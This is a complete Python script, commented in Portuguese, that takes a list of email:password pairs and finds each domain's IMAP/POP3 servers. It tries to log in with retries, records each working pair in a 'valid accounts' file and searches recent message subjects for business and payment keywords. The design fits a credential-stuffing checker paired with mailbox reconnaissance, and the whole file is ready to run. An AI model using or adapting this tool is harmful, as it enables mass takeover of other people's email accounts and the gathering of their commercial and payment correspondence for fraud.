#!/usr/bin/env python3
"""
Scanner automático de e-mails comerciais.

Fluxo principal:
1) Lê credenciais de emails.txt no formato email:senha.
2) Descobre servidores de entrada automaticamente em camadas:
   - SRV DNS
   - autoconfig Mozilla/Thunderbird
   - tabela de provedores conhecidos
   - heurística DNS + teste de porta
3) Tenta autenticar em IMAP/POP3 (SSL e STARTTLS), com retry.
4) Ao autenticar, grava imediatamente em contas_validas.txt.
5) Varre assunto das últimas mensagens e salva hits em mensagens_encontradas.json (JSONL).
6) Gera relatório final no console.
"""

from __future__ import annotations

import email
import imaplib
import json
import logging
import poplib
import socket
import ssl
import time
import unicodedata
import urllib.error
import urllib.request
import xml.etree.ElementTree as ET
from dataclasses import dataclass
from datetime import datetime
from email.header import decode_header
from pathlib import Path
from typing import Any, Dict, Iterable, List, Optional, Tuple


# ========================
# CONFIGURAÇÕES AJUSTÁVEIS
# ========================
EMAILS_FILE = Path(__file__).with_name("emails.txt")
VALID_ACCOUNTS_FILE = Path(__file__).with_name("contas_validas.txt")
FOUND_MESSAGES_FILE = Path(__file__).with_name("mensagens_encontradas.json")
ERROR_LOG_FILE = Path(__file__).with_name("erros.log")
DETAIL_LOG_FILE = Path(__file__).with_name("scanner_detalhado.log")

KEYWORDS = ["comercial", "proposta", "orcamento", "pagamento"]
MAX_MESSAGES_PER_ACCOUNT = 200
SOCKET_TIMEOUT_SECONDS = 5
RETRY_ATTEMPTS = 2
RETRY_WAIT_SECONDS = 1
DELAY_BETWEEN_ACCOUNTS_SECONDS = 3


@dataclass(frozen=True)
class Credential:
    email: str
    password: str


@dataclass(frozen=True)
class ServerCandidate:
    protocol: str  # IMAP ou POP3
    host: str
    port: int
    security: str  # SSL ou STARTTLS
    source: str  # srv, autoconfig, provider, heuristic


@dataclass
class AuthSession:
    email: str
    password: str
    protocol: str
    security: str
    host: str
    port: int
    source: str
    client: Any


KNOWN_PROVIDER_CONFIG: Dict[str, List[Tuple[str, str, int, str]]] = {
    "gmail.com": [
        ("IMAP", "imap.gmail.com", 993, "SSL"),
        ("POP3", "pop.gmail.com", 995, "SSL"),
    ],
    "googlemail.com": [
        ("IMAP", "imap.gmail.com", 993, "SSL"),
        ("POP3", "pop.gmail.com", 995, "SSL"),
    ],
    "outlook.com": [
        ("IMAP", "outlook.office365.com", 993, "SSL"),
        ("IMAP", "outlook.office365.com", 143, "STARTTLS"),
        ("POP3", "outlook.office365.com", 995, "SSL"),
    ],
    "hotmail.com": [
        ("IMAP", "outlook.office365.com", 993, "SSL"),
        ("IMAP", "outlook.office365.com", 143, "STARTTLS"),
        ("POP3", "outlook.office365.com", 995, "SSL"),
    ],
    "live.com": [
        ("IMAP", "outlook.office365.com", 993, "SSL"),
        ("IMAP", "outlook.office365.com", 143, "STARTTLS"),
        ("POP3", "outlook.office365.com", 995, "SSL"),
    ],
    "yahoo.com": [
        ("IMAP", "imap.mail.yahoo.com", 993, "SSL"),
        ("POP3", "pop.mail.yahoo.com", 995, "SSL"),
    ],
    "yahoo.com.br": [
        ("IMAP", "imap.mail.yahoo.com", 993, "SSL"),
        ("POP3", "pop.mail.yahoo.com", 995, "SSL"),
    ],
    "uol.com.br": [
        ("IMAP", "imap.uol.com.br", 993, "SSL"),
        ("POP3", "pop3.uol.com.br", 995, "SSL"),
    ],
    "bol.com.br": [
        ("IMAP", "imap.bol.com.br", 993, "SSL"),
        ("POP3", "pop3.bol.com.br", 995, "SSL"),
    ],
    "terra.com.br": [
        ("IMAP", "imap.terra.com.br", 993, "SSL"),
        ("POP3", "pop3.terra.com.br", 995, "SSL"),
    ],
    "ig.com.br": [
        ("IMAP", "imap.ig.com.br", 993, "SSL"),
        ("POP3", "pop.ig.com.br", 995, "SSL"),
    ],
    "globomail.com": [
        ("IMAP", "imap.globomail.com", 993, "SSL"),
        ("POP3", "pop.globomail.com", 995, "SSL"),
    ],
}


def build_keyword_index() -> Dict[str, str]:
    return {normalize_text(keyword): keyword for keyword in KEYWORDS}


def setup_logger() -> logging.Logger:
    logger = logging.getLogger("email_scanner")
    logger.setLevel(logging.INFO)
    logger.handlers.clear()

    formatter = logging.Formatter("%(asctime)s | %(levelname)s | %(message)s")

    detailed_handler = logging.FileHandler(DETAIL_LOG_FILE, mode="w", encoding="utf-8")
    detailed_handler.setLevel(logging.INFO)
    detailed_handler.setFormatter(formatter)

    errors_handler = logging.FileHandler(ERROR_LOG_FILE, mode="w", encoding="utf-8")
    errors_handler.setLevel(logging.ERROR)
    errors_handler.setFormatter(formatter)

    logger.addHandler(detailed_handler)
    logger.addHandler(errors_handler)
    logger.propagate = False
    return logger


def now_str() -> str:
    return datetime.now().strftime("%Y-%m-%d %H:%M:%S")


def normalize_text(value: str) -> str:
    decomposed = unicodedata.normalize("NFD", value)
    no_accents = "".join(ch for ch in decomposed if unicodedata.category(ch) != "Mn")
    return no_accents.casefold()


def decode_mime_value(raw_value: Optional[str]) -> str:
    if not raw_value:
        return ""

    chunks: List[str] = []
    for part, encoding in decode_header(raw_value):
        if isinstance(part, bytes):
            codec = encoding or "utf-8"
            try:
                chunks.append(part.decode(codec, errors="replace"))
            except LookupError:
                chunks.append(part.decode("utf-8", errors="replace"))
        else:
            chunks.append(part)
    return "".join(chunks).strip()


def local_name(tag: str) -> str:
    return tag.split("}", 1)[-1] if "}" in tag else tag


def read_credentials(file_path: Path, logger: logging.Logger) -> List[Credential]:
    credentials: List[Credential] = []

    if not file_path.exists():
        print(f"Arquivo de credenciais não encontrado: {file_path}")
        logger.error("Arquivo de credenciais não encontrado: %s", file_path)
        return credentials

    lines = file_path.read_text(encoding="utf-8", errors="replace").splitlines()
    for line_number, raw_line in enumerate(lines, start=1):
        line = raw_line.strip()
        if not line:
            continue
        if line.startswith("#"):
            continue
        if ":" not in line:
            warning = (
                f"Linha {line_number} ignorada (formato inválido). "
                "Esperado: email:senha"
            )
            print(warning)
            logger.warning(warning)
            continue

        email_part, password_part = line.split(":", 1)
        email_value = email_part.strip()
        password_value = password_part.strip()

        if "@" not in email_value or not password_value:
            warning = (
                f"Linha {line_number} ignorada (email/senha inválidos): {line}"
            )
            print(warning)
            logger.warning(warning)
            continue

        credentials.append(Credential(email=email_value, password=password_value))

    return credentials


def get_domain(email_address: str) -> str:
    if "@" not in email_address:
        return ""
    return email_address.split("@", 1)[1].strip().lower()


def is_port_open(host: str, port: int, timeout: int = SOCKET_TIMEOUT_SECONDS) -> bool:
    try:
        with socket.create_connection((host, port), timeout=timeout):
            return True
    except OSError:
        return False


def dedupe_candidates(candidates: Iterable[ServerCandidate]) -> List[ServerCandidate]:
    deduped: List[ServerCandidate] = []
    seen = set()
    for candidate in candidates:
        key = (
            candidate.protocol.upper(),
            candidate.host.lower(),
            int(candidate.port),
            candidate.security.upper(),
        )
        if key in seen:
            continue
        seen.add(key)
        deduped.append(candidate)
    return deduped


def discover_via_srv(domain: str, logger: logging.Logger) -> List[ServerCandidate]:
    discovered: List[ServerCandidate] = []
    services = [
        ("_imaps._tcp", "IMAP", "SSL"),
        ("_imap._tcp", "IMAP", "STARTTLS"),
        ("_pop3s._tcp", "POP3", "SSL"),
        ("_pop3._tcp", "POP3", "STARTTLS"),
    ]

    try:
        import dns.resolver  # type: ignore
    except ImportError:
        logger.warning(
            "dnspython não instalado; etapa SRV ignorada. Instale com: pip install dnspython"
        )
        return discovered

    resolver = dns.resolver.Resolver()
    resolver.lifetime = SOCKET_TIMEOUT_SECONDS

    for service_prefix, protocol, default_security in services:
        query = f"{service_prefix}.{domain}"
        try:
            answers = resolver.resolve(query, "SRV")
        except Exception as exc:  # noqa: BLE001
            logger.info("SRV sem resultado para %s: %s", query, exc)
            continue

        for answer in answers:
            host = str(answer.target).rstrip(".")
            port = int(answer.port)
            security = default_security
            if protocol == "IMAP" and port == 993:
                security = "SSL"
            elif protocol == "IMAP" and port == 143:
                security = "STARTTLS"
            elif protocol == "POP3" and port == 995:
                security = "SSL"
            elif protocol == "POP3" and port == 110:
                security = "STARTTLS"

            discovered.append(
                ServerCandidate(
                    protocol=protocol,
                    host=host,
                    port=port,
                    security=security,
                    source="srv",
                )
            )

    return dedupe_candidates(discovered)


def parse_autoconfig_xml(xml_content: str) -> List[ServerCandidate]:
    candidates: List[ServerCandidate] = []
    root = ET.fromstring(xml_content)

    for element in root.iter():
        if local_name(element.tag) != "incomingServer":
            continue

        server_type = element.attrib.get("type", "").strip().lower()
        if server_type not in {"imap", "pop3"}:
            continue

        hostname = ""
        port = 0
        socket_type = ""

        for child in element:
            child_name = local_name(child.tag)
            child_text = (child.text or "").strip()
            if child_name == "hostname":
                hostname = child_text
            elif child_name == "port":
                if child_text.isdigit():
                    port = int(child_text)
            elif child_name == "socketType":
                socket_type = child_text.upper()

        if not hostname:
            continue

        protocol = "IMAP" if server_type == "imap" else "POP3"
        security = "STARTTLS"
        if socket_type in {"SSL", "SSL/TLS"}:
            security = "SSL"
        elif socket_type == "STARTTLS":
            security = "STARTTLS"
        elif port in {993, 995}:
            security = "SSL"

        if port == 0:
            if protocol == "IMAP":
                port = 993 if security == "SSL" else 143
            else:
                port = 995 if security == "SSL" else 110

        candidates.append(
            ServerCandidate(
                protocol=protocol,
                host=hostname,
                port=port,
                security=security,
                source="autoconfig",
            )
        )

    return dedupe_candidates(candidates)


def discover_via_autoconfig(domain: str, logger: logging.Logger) -> List[ServerCandidate]:
    urls = [
        f"https://autoconfig.{domain}/mail/config-v1.1.xml",
        f"https://{domain}/.well-known/autoconfig/mail/config-v1.1.xml",
        f"https://{domain}/mail/config-v1.1.xml",
    ]

    context = ssl.create_default_context()
    for url in urls:
        request = urllib.request.Request(
            url=url,
            headers={"User-Agent": "Mozilla/5.0 (email-autodiscovery-script)"},
        )
        try:
            with urllib.request.urlopen(
                request, timeout=SOCKET_TIMEOUT_SECONDS, context=context
            ) as response:
                payload = response.read().decode("utf-8", errors="replace")
                candidates = parse_autoconfig_xml(payload)
                if candidates:
                    logger.info("Autoconfig OK em %s", url)
                    return candidates
        except (urllib.error.URLError, TimeoutError, ET.ParseError, ssl.SSLError) as exc:
            logger.info("Autoconfig sem resultado em %s: %s", url, exc)
            continue
        except Exception as exc:  # noqa: BLE001
            logger.warning("Erro inesperado no autoconfig %s: %s", url, exc)
            continue

    return []


def discover_via_known_providers(domain: str) -> List[ServerCandidate]:
    raw_candidates = KNOWN_PROVIDER_CONFIG.get(domain, [])
    candidates = [
        ServerCandidate(
            protocol=protocol,
            host=host,
            port=port,
            security=security,
            source="provider",
        )
        for protocol, host, port, security in raw_candidates
    ]
    return dedupe_candidates(candidates)


def discover_via_heuristic(domain: str) -> List[ServerCandidate]:
    candidates: List[ServerCandidate] = []
    imap_hosts = [f"imap.{domain}", f"mail.{domain}", f"mx.{domain}", domain]
    pop_hosts = [f"pop.{domain}", f"pop3.{domain}", f"mail.{domain}", f"mx.{domain}", domain]

    for host in imap_hosts:
        if is_port_open(host, 993):
            candidates.append(ServerCandidate("IMAP", host, 993, "SSL", "heuristic"))
        if is_port_open(host, 143):
            candidates.append(ServerCandidate("IMAP", host, 143, "STARTTLS", "heuristic"))

    for host in pop_hosts:
        if is_port_open(host, 995):
            candidates.append(ServerCandidate("POP3", host, 995, "SSL", "heuristic"))
        if is_port_open(host, 110):
            candidates.append(ServerCandidate("POP3", host, 110, "STARTTLS", "heuristic"))

    return dedupe_candidates(candidates)


def discover_server_candidates(domain: str, logger: logging.Logger) -> List[ServerCandidate]:
    layered_candidates: List[ServerCandidate] = []
    layered_candidates.extend(discover_via_srv(domain, logger))
    layered_candidates.extend(discover_via_autoconfig(domain, logger))
    layered_candidates.extend(discover_via_known_providers(domain))
    layered_candidates.extend(discover_via_heuristic(domain))

    return dedupe_candidates(layered_candidates)


def is_probable_auth_error(exc: Exception) -> bool:
    text = str(exc).lower()
    auth_markers = [
        "authentication",
        "auth failed",
        "login failed",
        "invalid credentials",
        "invalid user",
        "user/pass",
        "bad login",
    ]
    return any(marker in text for marker in auth_markers)


def connect_imap_ssl(candidate: ServerCandidate, credential: Credential) -> AuthSession:
    client = imaplib.IMAP4_SSL(candidate.host, candidate.port, timeout=SOCKET_TIMEOUT_SECONDS)
    client.login(credential.email, credential.password)
    return AuthSession(
        email=credential.email,
        password=credential.password,
        protocol="IMAP",
        security="SSL",
        host=candidate.host,
        port=candidate.port,
        source=candidate.source,
        client=client,
    )


def connect_imap_starttls(candidate: ServerCandidate, credential: Credential) -> AuthSession:
    client = imaplib.IMAP4(candidate.host, candidate.port, timeout=SOCKET_TIMEOUT_SECONDS)
    client.starttls(ssl_context=ssl.create_default_context())
    client.login(credential.email, credential.password)
    return AuthSession(
        email=credential.email,
        password=credential.password,
        protocol="IMAP",
        security="STARTTLS",
        host=candidate.host,
        port=candidate.port,
        source=candidate.source,
        client=client,
    )


def connect_pop_ssl(candidate: ServerCandidate, credential: Credential) -> AuthSession:
    client = poplib.POP3_SSL(candidate.host, candidate.port, timeout=SOCKET_TIMEOUT_SECONDS)
    client.user(credential.email)
    client.pass_(credential.password)
    return AuthSession(
        email=credential.email,
        password=credential.password,
        protocol="POP3",
        security="SSL",
        host=candidate.host,
        port=candidate.port,
        source=candidate.source,
        client=client,
    )


def connect_pop_starttls(candidate: ServerCandidate, credential: Credential) -> AuthSession:
    client = poplib.POP3(candidate.host, candidate.port, timeout=SOCKET_TIMEOUT_SECONDS)
    client.stls(context=ssl.create_default_context())
    client.user(credential.email)
    client.pass_(credential.password)
    return AuthSession(
        email=credential.email,
        password=credential.password,
        protocol="POP3",
        security="STARTTLS",
        host=candidate.host,
        port=candidate.port,
        source=candidate.source,
        client=client,
    )


def try_authentication(
    candidate: ServerCandidate,
    credential: Credential,
    logger: logging.Logger,
) -> Optional[AuthSession]:
    if not is_port_open(candidate.host, candidate.port):
        logger.info(
            "Porta fechada/sem resposta: %s:%s (%s/%s)",
            candidate.host,
            candidate.port,
            candidate.protocol,
            candidate.security,
        )
        return None

    max_attempts = RETRY_ATTEMPTS + 1
    for attempt in range(1, max_attempts + 1):
        try:
            if candidate.protocol == "IMAP" and candidate.security == "SSL":
                return connect_imap_ssl(candidate, credential)
            if candidate.protocol == "IMAP" and candidate.security == "STARTTLS":
                return connect_imap_starttls(candidate, credential)
            if candidate.protocol == "POP3" and candidate.security == "SSL":
                return connect_pop_ssl(candidate, credential)
            if candidate.protocol == "POP3" and candidate.security == "STARTTLS":
                return connect_pop_starttls(candidate, credential)
            return None
        except Exception as exc:  # noqa: BLE001
            auth_error = is_probable_auth_error(exc)
            logger.warning(
                "Falha autenticação tentativa %s/%s em %s:%s [%s/%s] para %s: %s",
                attempt,
                max_attempts,
                candidate.host,
                candidate.port,
                candidate.protocol,
                candidate.security,
                credential.email,
                exc,
            )

            if auth_error:
                logger.error(
                    "Erro de autenticação definitivo para %s em %s:%s",
                    credential.email,
                    candidate.host,
                    candidate.port,
                )
                return None

            if attempt < max_attempts:
                time.sleep(RETRY_WAIT_SECONDS)

    logger.error(
        "Falha após retries para %s em %s:%s [%s/%s]",
        credential.email,
        candidate.host,
        candidate.port,
        candidate.protocol,
        candidate.security,
    )
    return None


def close_session(session: AuthSession, logger: logging.Logger) -> None:
    try:
        if session.protocol == "IMAP":
            session.client.logout()
        else:
            session.client.quit()
    except Exception as exc:  # noqa: BLE001
        logger.warning("Erro ao encerrar sessão %s: %s", session.email, exc)


def write_valid_account(session: AuthSession) -> None:
    line = (
        f"{now_str()} | {session.email}:{session.password} | "
        f"{session.host}:{session.port} | {session.protocol}/{session.security}\n"
    )
    with VALID_ACCOUNTS_FILE.open("a", encoding="utf-8") as file:
        file.write(line)


def match_keywords(subject: str, keyword_index: Dict[str, str]) -> List[str]:
    normalized_subject = normalize_text(subject)
    found: List[str] = []
    for normalized_keyword, original_keyword in keyword_index.items():
        if normalized_keyword in normalized_subject:
            found.append(original_keyword)
    return found


def parse_message_headers(raw_bytes: bytes) -> Tuple[str, str, str]:
    message = email.message_from_bytes(raw_bytes)
    subject = decode_mime_value(message.get("Subject"))
    from_value = decode_mime_value(message.get("From"))
    date_value = decode_mime_value(message.get("Date"))
    return subject, from_value, date_value


def scan_imap(
    session: AuthSession,
    keyword_index: Dict[str, str],
    logger: logging.Logger,
) -> List[Dict[str, str]]:
    matches: List[Dict[str, str]] = []
    client = session.client

    status, _ = client.select("INBOX", readonly=True)
    if status != "OK":
        raise RuntimeError("Não foi possível selecionar INBOX via IMAP.")

    status, data = client.search(None, "ALL")
    if status != "OK" or not data:
        return matches

    message_ids = data[0].split()
    message_ids = message_ids[-MAX_MESSAGES_PER_ACCOUNT:]

    for message_id in message_ids:
        status, response = client.fetch(
            message_id, "(BODY.PEEK[HEADER.FIELDS (SUBJECT FROM DATE)])"
        )
        if status != "OK" or not response:
            continue

        header_bytes = b""
        for chunk in response:
            if isinstance(chunk, tuple) and len(chunk) >= 2 and isinstance(chunk[1], bytes):
                header_bytes += chunk[1]

        if not header_bytes:
            continue

        subject, from_value, date_value = parse_message_headers(header_bytes)
        found_terms = match_keywords(subject, keyword_index)
        for term in found_terms:
            matches.append(
                {
                    "timestamp": now_str(),
                    "conta": session.email,
                    "protocolo": f"{session.protocol}/{session.security}",
                    "servidor": f"{session.host}:{session.port}",
                    "assunto": subject,
                    "data": date_value,
                    "remetente": from_value,
                    "termo_encontrado": term,
                }
            )

    logger.info("Varredura IMAP finalizada para %s: %s hits", session.email, len(matches))
    return matches


def scan_pop3(
    session: AuthSession,
    keyword_index: Dict[str, str],
    logger: logging.Logger,
) -> List[Dict[str, str]]:
    matches: List[Dict[str, str]] = []
    client = session.client

    total_messages, _ = client.stat()
    if total_messages <= 0:
        return matches

    first_index = max(1, total_messages - MAX_MESSAGES_PER_ACCOUNT + 1)
    for msg_index in range(first_index, total_messages + 1):
        lines: List[bytes]
        try:
            _, lines, _ = client.top(msg_index, 0)
        except poplib.error_proto:
            try:
                _, lines, _ = client.retr(msg_index)
            except poplib.error_proto:
                continue

        raw_message = b"\n".join(lines)
        subject, from_value, date_value = parse_message_headers(raw_message)
        found_terms = match_keywords(subject, keyword_index)
        for term in found_terms:
            matches.append(
                {
                    "timestamp": now_str(),
                    "conta": session.email,
                    "protocolo": f"{session.protocol}/{session.security}",
                    "servidor": f"{session.host}:{session.port}",
                    "assunto": subject,
                    "data": date_value,
                    "remetente": from_value,
                    "termo_encontrado": term,
                }
            )

    logger.info("Varredura POP3 finalizada para %s: %s hits", session.email, len(matches))
    return matches


def append_found_messages(records: List[Dict[str, str]]) -> None:
    if not records:
        return
    with FOUND_MESSAGES_FILE.open("a", encoding="utf-8") as file:
        for record in records:
            file.write(json.dumps(record, ensure_ascii=False) + "\n")


def reset_output_files() -> None:
    VALID_ACCOUNTS_FILE.write_text("", encoding="utf-8")
    FOUND_MESSAGES_FILE.write_text("", encoding="utf-8")


def process_account(
    credential: Credential,
    index: int,
    total: int,
    discovery_cache: Dict[str, List[ServerCandidate]],
    keyword_index: Dict[str, str],
    logger: logging.Logger,
) -> Tuple[bool, int]:
    print(f"\nProcessando conta {index}/{total}: {credential.email}")
    logger.info("Início processamento da conta %s (%s/%s)", credential.email, index, total)

    domain = get_domain(credential.email)
    if not domain:
        logger.error("Domínio inválido para conta: %s", credential.email)
        print(f"{credential.email} -> domínio inválido.")
        return False, 0

    if domain in discovery_cache:
        candidates = discovery_cache[domain]
    else:
        candidates = discover_server_candidates(domain, logger)
        discovery_cache[domain] = candidates

    if not candidates:
        logger.error("Nenhum servidor candidato encontrado para domínio %s", domain)
        print(f"{credential.email} -> nenhum servidor encontrado para {domain}.")
        return False, 0

    logger.info("%s candidatos encontrados para %s", len(candidates), credential.email)

    session: Optional[AuthSession] = None
    for candidate in candidates:
        logger.info(
            "Tentando %s://%s:%s (%s) origem=%s para %s",
            candidate.protocol,
            candidate.host,
            candidate.port,
            candidate.security,
            candidate.source,
            credential.email,
        )
        session = try_authentication(candidate, credential, logger)
        if session is not None:
            write_valid_account(session)
            logger.info(
                "%s Autenticou em %s:%s via %s/%s (origem=%s)",
                credential.email,
                session.host,
                session.port,
                session.protocol,
                session.security,
                session.source,
            )
            print(
                f"{credential.email} Autenticou via "
                f"{session.protocol}/{session.security} em {session.host}:{session.port}"
            )
            break

    if session is None:
        logger.error("Autenticação falhou para %s", credential.email)
        print(f"{credential.email} -> não autenticou.")
        return False, 0

    relevant_count = 0
    try:
        if session.protocol == "IMAP":
            found = scan_imap(session, keyword_index, logger)
        else:
            found = scan_pop3(session, keyword_index, logger)
        append_found_messages(found)
        relevant_count = len(found)
        print(
            f"{credential.email} -> conectado com sucesso, "
            f"mensagens relevantes encontradas: {relevant_count}"
        )
    except Exception as exc:  # noqa: BLE001
        logger.error("Erro na varredura da conta %s: %s", credential.email, exc)
        print(f"{credential.email} -> erro na varredura: {exc}")
    finally:
        close_session(session, logger)

    return True, relevant_count


def run() -> None:
    logger = setup_logger()
    reset_output_files()
    keyword_index = build_keyword_index()

    credentials = read_credentials(EMAILS_FILE, logger)
    if not credentials:
        print("Nenhuma conta válida encontrada em emails.txt.")
        print(f"Consulte logs: {DETAIL_LOG_FILE} e {ERROR_LOG_FILE}")
        return

    total_accounts = len(credentials)
    success_count = 0
    accounts_with_relevant_messages = 0
    discovery_cache: Dict[str, List[ServerCandidate]] = {}

    print(f"Total de contas válidas carregadas: {total_accounts}")
    logger.info("Total de contas válidas carregadas: %s", total_accounts)

    for index, credential in enumerate(credentials, start=1):
        success, relevant = process_account(
            credential=credential,
            index=index,
            total=total_accounts,
            discovery_cache=discovery_cache,
            keyword_index=keyword_index,
            logger=logger,
        )
        if success:
            success_count += 1
        if relevant > 0:
            accounts_with_relevant_messages += 1

        if index < total_accounts and DELAY_BETWEEN_ACCOUNTS_SECONDS > 0:
            print(f"Aguardando {DELAY_BETWEEN_ACCOUNTS_SECONDS}s antes da próxima conta...")
            time.sleep(DELAY_BETWEEN_ACCOUNTS_SECONDS)

    print("\n===== RELATÓRIO FINAL =====")
    print(f"Total de contas processadas: {total_accounts}")
    print(f"Contas autenticadas com sucesso: {success_count}")
    print(f"Contas com mensagens relevantes: {accounts_with_relevant_messages}")
    print(f"Contas válidas: {VALID_ACCOUNTS_FILE}")
    print(f"Mensagens encontradas: {FOUND_MESSAGES_FILE}")
    print(f"Log detalhado: {DETAIL_LOG_FILE}")
    print(f"Log de erros: {ERROR_LOG_FILE}")

    logger.info("Resumo final: processadas=%s", total_accounts)
    logger.info("Resumo final: autenticadas=%s", success_count)
    logger.info("Resumo final: com mensagens relevantes=%s", accounts_with_relevant_messages)
    logger.info("Arquivo contas válidas: %s", VALID_ACCOUNTS_FILE)
    logger.info("Arquivo mensagens encontradas: %s", FOUND_MESSAGES_FILE)


if __name__ == "__main__":
    run()
